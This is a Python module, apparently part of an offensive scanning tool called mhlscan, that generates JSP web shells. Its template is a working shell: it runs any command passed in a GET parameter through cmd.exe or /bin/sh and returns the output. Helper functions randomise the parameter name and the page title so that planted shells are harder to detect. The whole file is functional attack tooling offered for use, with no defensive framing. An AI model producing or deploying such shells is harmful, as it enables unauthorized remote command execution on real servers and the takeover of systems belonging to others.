# -*- coding: utf-8 -*-
# GNU GPL License V3
# mhlscan by sigit-hdteamlabs
"""_shell.py — Generator JSP shell dinamis (random param + title)."""

import random
import string


JSP_TEMPLATE = '''<%@ page import="java.io.*" %>
<html>
<head><title>{title}</title>
<style>body{{font-family:monospace;background:#1e1e1e;color:#d4d4d4;padding:20px}}
h2{{color:#4ec9b0;border-bottom:1px solid #4ec9b0}}form{{margin-bottom:20px}}
input[type=text]{{background:#252526;color:#d4d4d4;border:1px solid #3e3e40;padding:10px;width:80%;border-radius:5px}}
input[type=submit]{{background:#0e639c;color:#fff;border:0;padding:10px 20px;cursor:pointer;border-radius:5px}}
pre{{background:#252526;border:1px solid #3e3e40;padding:15px;white-space:pre-wrap;word-wrap:break-word;border-radius:5px}}</style>
</head>
<body>
<h2>{title}</h2>
<form method="GET"><input type="text" name="{param}" size="80"
value="<%= request.getParameter("{param}") != null ? request.getParameter("{param}") : "" %>" autofocus/>
<input type="submit" value="Execute" /></form>
<pre><%
String cmd = request.getParameter("{param}");
if (cmd != null && !cmd.isEmpty()) {{
    try {{
        boolean isWin = System.getProperty("os.name").toLowerCase().startsWith("windows");
        ProcessBuilder pb = new ProcessBuilder();
        if (isWin) pb.command("cmd.exe", "/c", cmd);
        else       pb.command("/bin/sh", "-c", cmd);
        pb.redirectErrorStream(true);
        Process p = pb.start();
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = r.readLine()) != null)
            out.println(line.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;"));
        out.println("\\n---");
        out.println("Exit: " + p.waitFor());
    }} catch (Exception e) {{ out.println("Err: " + e.getMessage()); }}
}}
%></pre></body></html>'''


def make_shell(param="ppp", title=None):
    if title is None:
        title = "".join(random.choices(string.ascii_uppercase, k=3)) + \
                "".join(random.choices(string.digits, k=4))
    return JSP_TEMPLATE.format(param=param, title=title), param, title


def make_random_shell():
    param = "".join(random.choices(string.ascii_lowercase, k=6))
    title = "".join(random.choices(string.ascii_uppercase, k=3)) + \
            "".join(random.choices(string.digits, k=4))
    return make_shell(param=param, title=title)
